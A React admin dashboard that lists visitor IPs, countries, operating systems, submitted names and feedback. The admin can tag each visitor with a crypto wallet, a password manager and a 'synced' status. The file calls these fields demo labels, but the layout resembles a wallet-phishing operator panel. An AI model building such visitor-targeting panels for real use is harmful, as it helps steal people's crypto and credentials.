import {
  type FormEvent,
  useCallback,
  useEffect,
  useMemo,
  useState
} from "react";

type SyncStatus = "Synced" | "Not";

type VisitorActivity = {
  ipAddress: string;
  country: string | null;
  wallet: "metamask" | "phantom" | "rabby" | "tronlink" | "coinbase" | null;
  passwordManager: "1Password" | "Bitwarden" | null;
  syncStatus: SyncStatus;
  lastVisitedAt: string;
  fullNames: {
    id: string;
    fullName: string;
    submittedAt: string;
  }[];
  feedbacks: {
    id: string;
    feedback: string;
    submittedAt: string;
  }[];
  visits: {
    id: string;
    operatingSystem: string;
    visitedAt: string;
  }[];
};

type ActivityDraft = {
  ipAddress: string;
  wallet: VisitorActivity["wallet"];
  passwordManager: VisitorActivity["passwordManager"];
  syncStatus: VisitorActivity["syncStatus"];
  fullNames: VisitorActivity["fullNames"];
  feedbacks: VisitorActivity["feedbacks"];
};

const Admin = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [isCheckingSession, setIsCheckingSession] = useState(true);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [search, setSearch] = useState("");
  const [activities, setActivities] = useState<VisitorActivity[]>([]);
  const [editingActivity, setEditingActivity] = useState<ActivityDraft | null>(
    null
  );
  const [error, setError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const loadActivities = useCallback(async () => {
    const response = await fetch("/api/admin/activity", {
      cache: "no-store",
      credentials: "same-origin"
    });

    if (response.status === 401) {
      setIsAuthenticated(false);
      return false;
    }
    if (!response.ok) {
      throw new Error(`Unable to load visitor activity (${response.status}).`);
    }

    const data = (await response.json()) as { activities: VisitorActivity[] };
    setActivities(data.activities);
    setIsAuthenticated(true);
    return true;
  }, []);

  useEffect(() => {
    loadActivities()
      .catch((loadError: unknown) => {
        setError(
          loadError instanceof Error
            ? loadError.message
            : "Unable to load visitor activity."
        );
      })
      .finally(() => setIsCheckingSession(false));
  }, [loadActivities]);

  useEffect(() => {
    if (!isAuthenticated) return;

    const interval = window.setInterval(() => {
      loadActivities().catch((loadError: unknown) => {
        setError(
          loadError instanceof Error
            ? loadError.message
            : "Unable to refresh visitor activity."
        );
      });
    }, 15000);

    return () => window.clearInterval(interval);
  }, [isAuthenticated, loadActivities]);

  const filteredActivities = useMemo(() => {
    const query = search.trim().toLowerCase();
    if (!query) return activities;
    return activities.filter(
      ({
        country,
        feedbacks,
        fullNames,
        ipAddress,
        passwordManager,
        visits,
        wallet
      }) =>
        ipAddress.toLowerCase().includes(query) ||
        (country ?? "").toLowerCase().includes(query) ||
        (wallet ?? "").toLowerCase().includes(query) ||
        (passwordManager ?? "").toLowerCase().includes(query) ||
        feedbacks.some(({ feedback }) =>
          feedback.toLowerCase().includes(query)
        ) ||
        fullNames.some(({ fullName }) =>
          fullName.toLowerCase().includes(query)
        ) ||
        visits.some((visit) =>
          visit.operatingSystem.toLowerCase().includes(query)
        )
    );
  }, [activities, search]);

  const handleSaveActivity = async () => {
    if (!editingActivity) return;
    setError("");

    try {
      const response = await fetch("/api/admin/activity", {
        body: JSON.stringify(editingActivity),
        credentials: "same-origin",
        headers: { "Content-Type": "application/json" },
        method: "PUT"
      });
      if (!response.ok) {
        throw new Error(`Unable to save visitor details (${response.status}).`);
      }
      await loadActivities();
      setEditingActivity(null);
    } catch (saveError) {
      setError(
        saveError instanceof Error
          ? saveError.message
          : "Unable to save visitor details."
      );
    }
  };

  const openActivity = (activity: VisitorActivity) => {
    setEditingActivity({
      feedbacks: activity.feedbacks,
      fullNames: activity.fullNames,
      ipAddress: activity.ipAddress,
      passwordManager: activity.passwordManager,
      syncStatus: activity.syncStatus ?? "Synced",
      wallet: activity.wallet
    });
  };

  const handleLogin = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsSubmitting(true);
    setError("");

    try {
      const response = await fetch("/api/admin/auth", {
        body: JSON.stringify({ password, username }),
        credentials: "same-origin",
        headers: { "Content-Type": "application/json" },
        method: "POST"
      });

      if (!response.ok) {
        setError(
          response.status === 401
            ? "Incorrect username or password."
            : `Unable to sign in (${response.status}).`
        );
        return;
      }

      setPassword("");
      await loadActivities();
    } catch (loginError) {
      setError(
        loginError instanceof Error ? loginError.message : "Unable to sign in."
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleLogout = async () => {
    setError("");
    try {
      const response = await fetch("/api/admin/auth", {
        credentials: "same-origin",
        method: "DELETE"
      });
      if (!response.ok) {
        throw new Error(`Unable to log out (${response.status}).`);
      }
      setIsAuthenticated(false);
      setActivities([]);
      setUsername("");
      setPassword("");
    } catch (logoutError) {
      setError(
        logoutError instanceof Error
          ? logoutError.message
          : "Unable to log out."
      );
    }
  };

  if (isCheckingSession) {
    return (
      <main className="p-6 text-gray-500 text-sm">Checking admin session…</main>
    );
  }

  if (!isAuthenticated) {
    return (
      <main className="flex min-h-screen items-center justify-center bg-gray-50 px-4">
        <form
          className="w-full max-w-sm space-y-5 rounded-xl border border-gray-200 bg-white p-6 shadow-sm"
          onSubmit={handleLogin}
        >
          <div className="space-y-1">
            <h1 className="font-semibold text-2xl">Admin</h1>
            <p className="text-gray-500 text-sm">
              Sign in to view visitor activity.
            </p>
          </div>
          <label className="block space-y-1.5 text-sm">
            <span className="font-medium">Username</span>
            <input
              autoComplete="username"
              className="w-full rounded-lg border border-gray-300 px-3 py-2 outline-none focus:border-blue-500"
              onChange={(event) => setUsername(event.target.value)}
              required
              value={username}
            />
          </label>
          <label className="block space-y-1.5 text-sm">
            <span className="font-medium">Password</span>
            <input
              autoComplete="current-password"
              className="w-full rounded-lg border border-gray-300 px-3 py-2 outline-none focus:border-blue-500"
              onChange={(event) => setPassword(event.target.value)}
              required
              type="password"
              value={password}
            />
          </label>
          {error && (
            <p className="text-red-600 text-sm" role="alert">
              {error}
            </p>
          )}
          <button
            className="w-full rounded-lg bg-blue-600 px-4 py-2 font-medium text-sm text-white hover:bg-blue-700 disabled:opacity-60"
            disabled={isSubmitting}
            type="submit"
          >
            {isSubmitting ? "Signing in…" : "Log in"}
          </button>
        </form>
      </main>
    );
  }

  return (
    <main className="space-y-5 p-6">
      <div className="flex flex-wrap items-center justify-between gap-3">
        <div>
          <h1 className="font-semibold text-xl">Visitor activity</h1>
          <p className="mt-1 text-gray-500 text-sm">
            In-memory demo log; records are temporary and may be lost when the
            server restarts.
          </p>
        </div>
        <button
          className="rounded-lg border border-gray-300 px-3 py-2 font-medium text-sm hover:bg-gray-50"
          onClick={handleLogout}
          type="button"
        >
          Log out
        </button>
      </div>
      {error && (
        <p className="text-red-600 text-sm" role="alert">
          {error}
        </p>
      )}
      <label className="block max-w-sm space-y-1.5 text-sm">
        <span className="font-medium">
          Search by IP address, country, or operating system
        </span>
        <input
          className="w-full rounded-lg border border-gray-300 px-3 py-2 outline-none focus:border-blue-500"
          onChange={(event) => setSearch(event.target.value)}
          placeholder="Search activity"
          type="search"
          value={search}
        />
      </label>
      <div className="overflow-x-auto rounded-xl border border-gray-300 shadow-sm">
        <table className="w-full border-collapse text-left text-sm">
          <thead className="bg-gray-100 text-gray-700">
            <tr className="border-gray-300 border-b">
              <th
                className="border-gray-300 border-r px-4 py-3.5 font-semibold tracking-wide"
                scope="col"
              >
                Last Visited At
              </th>
              <th
                className="border-gray-300 border-r px-4 py-3.5 font-semibold tracking-wide"
                scope="col"
              >
                IP address
              </th>
              <th
                className="border-gray-300 border-r px-4 py-3.5 font-semibold tracking-wide"
                scope="col"
              >
                Country
              </th>
              <th
                className="px-4 py-3.5 font-semibold tracking-wide"
                scope="col"
              >
                Operating system
              </th>
              <th
                className="border-gray-300 border-l px-4 py-3.5 font-semibold tracking-wide"
                scope="col"
              >
                Sync status
              </th>
              <th
                className="border-gray-300 border-l px-4 py-3.5 font-semibold tracking-wide"
                scope="col"
              >
                Wallet
              </th>
              <th
                className="border-gray-300 border-l px-4 py-3.5 font-semibold tracking-wide"
                scope="col"
              >
                Password
              </th>
            </tr>
          </thead>
          <tbody>
            {filteredActivities.map((activity) => (
              <tr
                aria-label={`View visitor details for ${activity.ipAddress}`}
                className="cursor-pointer border-gray-200 border-b last:border-b-0 odd:bg-white even:bg-gray-50 hover:bg-blue-50 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-blue-500 focus-visible:ring-inset"
                key={activity.ipAddress}
                onClick={() => openActivity(activity)}
                onKeyDown={(event) => {
                  if (event.key === "Enter" || event.key === " ") {
                    event.preventDefault();
                    openActivity(activity);
                  }
                }}
                tabIndex={0}
              >
                <td className="whitespace-nowrap border-gray-200 border-r px-4 py-3">
                  {new Date(activity.lastVisitedAt).toLocaleString()}
                </td>
                <td className="whitespace-nowrap border-gray-200 border-r px-4 py-3">
                  <span className="font-mono text-blue-700">
                    {activity.ipAddress}
                  </span>
                </td>
                <td className="whitespace-nowrap border-gray-200 border-r px-4 py-3">
                  {activity.country ?? "Unknown"}
                </td>
                <td className="px-4 py-3">
                  {activity.visits[0]?.operatingSystem ?? "Unknown"}
                </td>
                <td className="whitespace-nowrap border-gray-200 border-l px-4 py-3">
                  {activity.syncStatus}
                </td>
                <td className="whitespace-nowrap border-gray-200 border-l px-4 py-3">
                  {activity.wallet === "metamask"
                    ? "MetaMask"
                    : activity.wallet === "phantom"
                      ? "Phantom"
                      : activity.wallet === "tronlink"
                        ? "TronLink"
                        : activity.wallet === "coinbase"
                          ? "Coinbase"
                          : activity.wallet === "rabby"
                            ? "Rabby"
                            : "Not set"}
                </td>
                <td className="whitespace-nowrap border-gray-200 border-l px-4 py-3">
                  {activity.passwordManager ?? "Not set"}
                </td>
              </tr>
            ))}
            {filteredActivities.length === 0 && (
              <tr className="bg-white">
                <td
                  className="border-gray-200 border-t px-4 py-8 text-center text-gray-500"
                  colSpan={7}
                >
                  {activities.length === 0
                    ? "No visitor activity recorded yet."
                    : "No activity matches your search."}
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>
      <p className="text-gray-500 text-xs">
        This demo records the request IP address, Vercel-provided country code,
        and inferred operating system.
      </p>
      {editingActivity && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
          <section
            aria-labelledby="visitor-activity-title"
            aria-modal="true"
            className="flex max-h-[calc(100vh-2rem)] w-full max-w-lg flex-col overflow-hidden rounded-xl bg-white shadow-xl"
            role="dialog"
          >
            <div className="space-y-1 border-gray-200 border-b p-5">
              <h2 className="font-semibold text-lg" id="visitor-activity-title">
                Visitor details
              </h2>
              <p className="font-mono text-gray-500 text-sm">
                {editingActivity.ipAddress}
              </p>
              <p className="text-gray-500 text-xs">
                Wallet and password fields are admin-only labels and are not
                collected from visitors.
              </p>
            </div>
            <div className="space-y-5 overflow-y-auto p-5">
              <label className="block space-y-1.5 text-sm">
                <span className="font-medium">Sync Status</span>
                <select
                  className="w-full rounded-lg border border-gray-300 bg-white px-3 py-2"
                  onChange={(event) =>
                    setEditingActivity({
                      ...editingActivity,
                      syncStatus:
                        event.target.value === "Not" ? "Not" : "Synced"
                    })
                  }
                  value={editingActivity.syncStatus}
                >
                  <option value="Synced">Synced</option>
                  <option value="Not">Not</option>
                </select>
              </label>
              <label className="block space-y-1.5 text-sm">
                <span className="font-medium">Wallet</span>
                <select
                  className="w-full rounded-lg border border-gray-300 bg-white px-3 py-2"
                  onChange={(event) =>
                    setEditingActivity({
                      ...editingActivity,
                      wallet: [
                        "metamask",
                        "phantom",
                        "tronlink",
                        "coinbase",
                        "rabby"
                      ].includes(event.target.value)
                        ? event.target.value === "metamask"
                          ? "metamask"
                          : event.target.value === "phantom"
                            ? "phantom"
                            : event.target.value === "tronlink"
                              ? "tronlink"
                              : event.target.value === "coinbase"
                                ? "coinbase"
                                : "rabby"
                        : null
                    })
                  }
                  value={editingActivity.wallet ?? ""}
                >
                  <option value="">Not set</option>
                  <option value="metamask">MetaMask</option>
                  <option value="phantom">Phantom</option>
                  <option value="tronlink">TronLink</option>
                  <option value="coinbase">Coinbase</option>
                  <option value="rabby">Rabby</option>
                </select>
              </label>
              <label className="block space-y-1.5 text-sm">
                <span className="font-medium">Password</span>
                <select
                  className="w-full rounded-lg border border-gray-300 bg-white px-3 py-2"
                  onChange={(event) =>
                    setEditingActivity({
                      ...editingActivity,
                      passwordManager: ["1Password", "Bitwarden"].includes(
                        event.target.value
                      )
                        ? event.target.value === "1Password"
                          ? "1Password"
                          : "Bitwarden"
                        : null
                    })
                  }
                  value={editingActivity.passwordManager ?? ""}
                >
                  <option value="">Not set</option>
                  <option value="1Password">1Password</option>
                  <option value="Bitwarden">Bitwarden</option>
                </select>
              </label>
              <section
                aria-labelledby="submitted-names-title"
                className="space-y-2"
              >
                <h3 className="font-medium text-sm" id="submitted-names-title">
                  Submitted full names
                </h3>
                {editingActivity.fullNames.length > 0 ? (
                  <ol className="divide-y divide-gray-100 rounded-lg border border-gray-200">
                    {editingActivity.fullNames.map((entry) => (
                      <li
                        className="flex items-center justify-between gap-4 px-3 py-2.5 text-sm"
                        key={entry.id}
                      >
                        <span>{entry.fullName}</span>
                        <time
                          className="shrink-0 text-gray-500"
                          dateTime={entry.submittedAt}
                        >
                          {new Date(entry.submittedAt).toLocaleString()}
                        </time>
                      </li>
                    ))}
                  </ol>
                ) : (
                  <p className="text-gray-500 text-sm">No names submitted.</p>
                )}
              </section>
              <section
                aria-labelledby="submitted-feedbacks-title"
                className="space-y-2"
              >
                <h3
                  className="font-medium text-sm"
                  id="submitted-feedbacks-title"
                >
                  Submitted feedbacks
                </h3>
                {editingActivity.feedbacks.length > 0 ? (
                  <ol className="divide-y divide-gray-100 rounded-lg border border-gray-200">
                    {editingActivity.feedbacks.map((entry) => (
                      <li
                        className="flex items-center justify-between gap-4 px-3 py-2.5 text-sm"
                        key={entry.id}
                      >
                        <span>{entry.feedback}</span>
                        <time
                          className="shrink-0 text-gray-500"
                          dateTime={entry.submittedAt}
                        >
                          {new Date(entry.submittedAt).toLocaleString()}
                        </time>
                      </li>
                    ))}
                  </ol>
                ) : (
                  <p className="text-gray-500 text-sm">
                    No feedbacks submitted.
                  </p>
                )}
              </section>
              <section
                aria-labelledby="visit-history-title"
                className="space-y-2"
              >
                <h3 className="font-medium text-sm" id="visit-history-title">
                  Visit history
                </h3>
                <ol className="max-h-56 divide-y divide-gray-100 overflow-y-auto rounded-lg border border-gray-200">
                  {activities
                    .find(
                      (activity) =>
                        activity.ipAddress === editingActivity.ipAddress
                    )
                    ?.visits.map((visit) => (
                      <li
                        className="flex items-center justify-between gap-4 px-3 py-2.5 text-sm"
                        key={visit.id}
                      >
                        <time dateTime={visit.visitedAt}>
                          {new Date(visit.visitedAt).toLocaleString()}
                        </time>
                        <span className="text-gray-500">
                          {visit.operatingSystem}
                        </span>
                      </li>
                    ))}
                </ol>
              </section>
            </div>
            <div className="flex justify-end gap-2 border-gray-200 border-t p-4">
              <button
                className="rounded-lg border border-gray-300 px-4 py-2 font-medium text-sm hover:bg-gray-50"
                onClick={() => setEditingActivity(null)}
                type="button"
              >
                Cancel
              </button>
              <button
                className="rounded-lg bg-blue-600 px-4 py-2 font-medium text-sm text-white hover:bg-blue-700"
                onClick={handleSaveActivity}
                type="button"
              >
                Save
              </button>
            </div>
          </section>
        </div>
      )}
    </main>
  );
};

export default Admin;
